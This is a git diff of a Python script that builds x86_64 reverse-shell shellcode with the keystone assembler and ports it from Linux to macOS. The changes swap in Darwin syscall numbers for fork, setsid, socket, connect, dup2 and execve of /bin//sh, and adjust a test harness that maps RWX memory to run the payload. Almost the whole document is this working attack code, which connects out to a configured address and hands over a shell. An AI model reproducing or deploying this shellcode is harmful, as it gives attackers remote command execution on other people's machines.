@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+# https://sigsegv.pl/osx-bsd-syscalls/ mac os
 import ctypes, struct, binascii, os, socket
 from keystone import *
 
@@ -62,33 +62,36 @@ def main():
     # Note: null-byte depends on the address and port.
     # Special modifications might be needed for some address.
     address = sockaddr()
-    # http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
+    # https://sigsegv.pl/osx-bsd-syscalls/ must convert to hex
     # Shellcode is here
 
     nanosleepvalue = "0x1" # 1 seconds
 
     assembly = (
             "fork:"
-            "mov rax, 57;" # fork
-            "syscall;" #
-            "cmp rax, 0;" # result : 1 is equal, 0 is not equal the result is stored in the zero flag register
-            "jne parent;" # jump not equal parent process go to parent
+            "mov rax, 0x2000002;" # fork
+            "syscall;"
+            "orl	rdx,rdx;"	# CF=OF=0,  ZF set if zero result	
+            "jz	parent;		"# parent, since r1 == 0 in parent, 1 in child
+            # https://opensource.apple.com/source/xnu/xnu-2050.48.11/libsyscall/custom/__fork.s
+            #https://lists.apple.com/archives/darwin-kernel/2008/Apr/msg00124.html
+            #"INT3;"
             "setsid:"
-            "mov rax, 112;" # setsid
+            "mov rax, 0x2000093;" # setsid
             "syscall;"
 
-
+            
             "socket:"
-            "mov rax, 41;"  # Push/pop will set syscall num
+            #"INT3;"
+            "mov rax, 0x2000061;"  # Push/pop will set syscall num
             "mov rdi, 2;"  # AF_INET = 2
             "mov rsi, 1;"  # SOCK_STREAM = 1
             "mov rdx, 0;"
-            "syscall;"  # socket(AF_INET, SOCK_STREAM, 0)
-
+            "syscall;"  # socket(AF_INET, SOCK_STREAM, 0) 
 
             "connect:"
             "mov rdi, rax;"  # put   result in rdi
-            "mov rax, 42;"
+            "mov rax, 0x2000062;"
             "mov rcx, "+ address + ";" # cant push directly because can only push 32 bit on x86_64 platforms must use a register
             "push rcx;"
             "push rsp;"  # mov rsi, rsp. This it the pointer to sockaddr
@@ -96,40 +99,41 @@ def main():
             "mov rdx, 16;"  # sockaddr length
             "syscall;"  # connect(s, addr, 16)
 
+            
+           "dup2:" # redirect stdin stderr stdout shuld use loop
+           "mov rax, 0x200005A;"
+           "mov rsi, 2;"
+           "syscall;"
+           "mov rax, 0x200005A;"
+           "mov rsi, 1;"
+           "syscall;"
+           "mov rax, 0x200005A;"
+           "mov rsi, 0;"
+           "syscall;"
 
-            "dup2:" # redirect stdin stderr stdout shuld use loop
-            "mov rax, 33 ;"
-            "mov rsi, 2;"
-            "syscall;"
-            "mov rax, 33 ;"
-            "mov rsi, 1;"
-            "syscall;"
-            "mov rax, 33 ;"
-            "mov rsi, 0;"
-            "syscall;"
-
-
-            "execve:"
-            "mov rax, 59;"  # execve syscall is 59
-            "mov rcx, 0x68732f2f6e69622f;"  # /bin//sh
-            "push 0;" # we need to push a null byte on the stack  because string are null terminated
-            "push rcx;" # then push the string on the stack
-            "push rsp;"  # rsp points to the top of the stack, which is occupied by /bin/sh
-            "pop rdi;"  # We use a push/pop to prevent null-byte and get a shorter shellcode
-            "mov rsi, 0;"
-            "mov rdx, 0;"
-            "syscall;"  # execve('/bin//sh', NULL, NULL)
-
+           "execve:"
+           "mov rax, 0x200003B;"  # execve syscall is 59
+           "mov rcx, 0x68732f2f6e69622f;"  # /bin//sh
+           "push 0;" # we need to push a null byte on the stack  because string are null terminated
+           "push rcx;" # then push the string on the stack
+           "push rsp;"  # rsp points to the top of the stack, which is occupied by /bin/sh
+           "pop rdi;"  # We use a push/pop to prevent null-byte and get a shorter shellcode
+           "mov rsi, 0;"
+           "mov rdx, 0;"
+           "syscall;"  # execve('/bin//sh', NULL, NULL)
+           # http://uninformed.org/index.cgi?v=1&a=1&p=16 must call fork for it to work
 
             "parent:"
-            "mov rcx, "+ nanosleepvalue + ";"
-            "push rcx;"
-            "push rsp;"  # mov rsi, rsp. This it the pointer to timespec
-            "pop rdi;"
-            "mov rsi, 0;" # no nanoseconds so NULL rip null byte should negate this shit
-            "mov rax, 35;" # nanosleep
-            "syscall;"
-            "jmp parent;" # infinite loop
+            # no sleep system call currently ( migth get terminated by the os )
+            #"mov rcx, "+ nanosleepvalue + ";"
+            #"push rcx;"
+            #"push rsp;"  # mov rsi, rsp. This it the pointer to timespec
+            #"pop rdi;"
+            #"mov rsi, 0;" # no nanoseconds so NULL rip null byte should negate this shit
+            #"mov rax, 35;" # nanosleep
+            #"syscall;"
+            # TODO add sleep to prevent parent from getting killed
+            "jmp parent;"
 
     )
 
@@ -150,7 +154,7 @@ def main():
     #####################################################################
     #                   TESTING THE SHELLCODE                           #
     #####################################################################
-
+    #https://www.exploit-db.com/exploits/38065
     # The rest of the script is used to test the shellcode. Don't run this if you just need the shellcode
 
     # Leave time to attach the debugger
@@ -158,8 +162,8 @@ def main():
     input()
 
     # Load libraries
-    libc = ctypes.cdll.LoadLibrary("libc.so.6")
-    libpthread = ctypes.cdll.LoadLibrary("libpthread.so.0")
+    libc = ctypes.cdll.LoadLibrary("libc.dylib")
+    libpthread = ctypes.cdll.LoadLibrary("libpthread.dylib")
 
     # Put the shellcode into a ctypes valid type.
     shellcode = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
@@ -174,12 +178,27 @@ def main():
     # mmap acts like malloc, but can also set memory protection so we can create a Write/Execute shellcodefer
     # void *mmap(void *addr, size_t len, int prot, int flags,
     #   int fildes, off_t off);
+#
+#Protections are chosen from these bits, or-ed together
+#
+#define	PROT_NONE	0x00	/* [MC2] no permissions */
+#define	PROT_READ	0x01	/* [MC2] pages can be read */
+#define	PROT_WRITE	0x02	/* [MC2] pages can be written */
+#define	PROT_EXEC	0x04	/* [MC2] pages can be executed */
+
+# flags https://github.com/nneonneo/osx-10.9-opensource/blob/master/xnu-2422.1.72/bsd/sys/mman.h
+#define	MAP_SHARED	0x0001		/* [MF|SHM] share changes */
+#define	MAP_ANON	0x1000	/* allocated from memory, swap space */
+#define	MAP_PRIVATE	0x0002		/* [MF|SHM] changes are private */
     ptr = libc.mmap(ctypes.c_int64(0),  # NULL
                     ctypes.c_int(page_size),  # Pagesize, needed for alignment
-                    ctypes.c_int(0x07),  # Read/Write/Execute: PROT_READ | PROT_WRITE | PROT_EXEC
-                    ctypes.c_int(0x21),  # MAP_ANONYMOUS | MAP_SHARED
+                    ctypes.c_int(0x01 | 0x02 | 0x04),  # Read/Write/Execute: PROT_READ | PROT_WRITE | PROT_EXEC
+                    ctypes.c_int(0x1000 | 0x0002),  # MAP_ANONYMOUS | MAP_PRIVATE
                     ctypes.c_int(-1),  # No file descriptor
                     ctypes.c_int(0))  # No offset
+                    
+
+    print(ptr)
 
     # Copy shellcode to newly allocated page.
     libc.memcpy(ptr,  # Destination of our shellcode
